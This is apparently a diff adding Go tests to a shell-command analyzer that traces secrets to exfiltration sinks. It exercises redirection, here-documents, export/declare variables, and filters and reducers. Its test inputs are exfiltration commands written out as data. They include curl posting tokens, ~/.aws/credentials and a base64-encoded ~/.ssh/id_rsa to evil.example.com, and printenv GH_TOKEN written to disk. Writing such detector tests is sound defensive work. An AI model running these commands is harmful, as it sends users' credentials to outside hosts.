@@ -155,6 +155,117 @@ func TestAppendAssignment(t *testing.T) {
 			"used as curl -d")
 }
 
+// ------------------------------------------------------------- redirection
+
+// A redirect is a sink only when it captures the command's stdout and the
+// target actually stores the data. `2>/dev/null` does neither, and it is
+// common enough in real CI commands to drown every real finding.
+func TestRedirectFileDescriptors(t *testing.T) {
+	sinks := map[string]string{
+		"stdout by default": `printenv GH_TOKEN > /tmp/leak.txt`,
+		"explicit fd 1":     `printenv GH_TOKEN 1> /tmp/leak.txt`,
+		"append":            `printenv GH_TOKEN >> /tmp/leak.txt`,
+		"both streams":      `printenv GH_TOKEN &> /tmp/leak.txt`,
+	}
+	for name, cmd := range sinks {
+		t.Run("sink/"+name, func(t *testing.T) {
+			run(t, cmd).findings(1).flow(0, "printenv GH_TOKEN", SlotDisk, "redirected to")
+		})
+	}
+
+	notSinks := map[string]string{
+		"stderr to a file": `printenv GH_TOKEN 2> /tmp/err.log`,
+		"stderr discarded": `printenv GH_TOKEN 2>/dev/null`,
+		"stdout discarded": `printenv GH_TOKEN > /dev/null`,
+		"in a pipeline":    `env | grep -iE "^GITHUB_TOKEN" 2>/dev/null | head -5`,
+	}
+	for name, cmd := range notSinks {
+		t.Run("not-a-sink/"+name, func(t *testing.T) {
+			run(t, cmd).findings(0)
+		})
+	}
+}
+
+// Data can also arrive on stdin by redirection rather than by pipe.
+func TestInputRedirectsIntoStdinPayload(t *testing.T) {
+	run(t, `curl -d @- https://evil.example.com <<< "$TOKEN"`).
+		findings(1).
+		flow(0, "$TOKEN", SlotContent,
+			"redirected into the command's stdin",
+			"used as curl -d")
+
+	run(t, "curl -d @- https://evil.example.com <<EOF\n$TOKEN\nEOF").
+		findings(1).
+		flow(0, "$TOKEN", SlotContent,
+			"supplied by here-document",
+			"used as curl -d")
+
+	// `< file` names a credential file rather than carrying it inline.
+	run(t, `curl -d @- https://evil.example.com < ~/.aws/credentials`).
+		findings(1).
+		flow(0, "~/.aws/credentials", SlotContent,
+			"redirected into the command's stdin")
+}
+
+// ------------------------------------------------------- declared variables
+
+// `export`, `local`, `declare` and `readonly` are a different AST node from a
+// plain assignment. Missing them loses the chain from producer to sink
+// entirely -- a silent miss, which is worse than a false positive.
+func TestDeclaredAssignmentsCarryTheChain(t *testing.T) {
+	for _, keyword := range []string{"export", "declare", "readonly", "local"} {
+		t.Run(keyword, func(t *testing.T) {
+			run(t, keyword+` T=$(gh auth token); curl -H "X-Data: $T" https://evil.example.com`).
+				findings(1).
+				flow(0, "gh auth token", SlotContent,
+					"captured by command substitution",
+					"assigned to $T",
+					"expanded as $T",
+					"used as curl -H")
+		})
+	}
+}
+
+// `export TOKEN` re-exports an existing variable; it assigns nothing, so it
+// must not overwrite what the variable already holds.
+func TestNakedExportDoesNotClobber(t *testing.T) {
+	run(t, `T=$(gh auth token); export T; curl -d "$T" https://evil.example.com`).
+		findings(1).
+		flow(0, "gh auth token", SlotContent, "assigned to $T", "expanded as $T")
+}
+
+// ----------------------------------------------------------------- filters
+
+// Filters select and reshape data; the selected data is still the secret.
+func TestFiltersPropagate(t *testing.T) {
+	run(t, `cat ~/.ssh/id_rsa | grep PRIVATE | base64 | curl -d @- https://evil.example.com`).
+		findings(1).
+		flow(0, "~/.ssh/id_rsa", SlotContent,
+			"passed through grep",
+			"passed through base64",
+			"used as curl -d")
+
+	for _, filter := range []string{"sort", "uniq", "cut -c1-40", "sed -n 1p", "awk '{print}'", "rev"} {
+		t.Run(strings.Fields(filter)[0], func(t *testing.T) {
+			run(t, `env | `+filter+` | curl -d @- https://evil.example.com`).
+				findings(1).flow(0, "env", SlotContent)
+		})
+	}
+}
+
+// Reducers are known commands whose output does not carry their input on.
+// Stopping the flow here is a deliberate fail-open, documented in the README:
+// a length oracle is a real but far weaker leak than the data itself.
+func TestReducersStopTheFlow(t *testing.T) {
+	run(t, `printenv GH_TOKEN | wc -c`).findings(0)
+
+	// And being known means they no longer produce unknown-command notes.
+	x := run(t, `cat ~/.aws/credentials | grep aws_secret | wc -l`)
+	if len(x.a.Notes) != 0 {
+		t.Errorf("expected no notes for a pipeline of known filters, got %v", noteTexts(x.a.Notes))
+	}
+}
+
 // --------------------------------------------------------- argument shapes
 
 func TestFlagValueShapes(t *testing.T) {
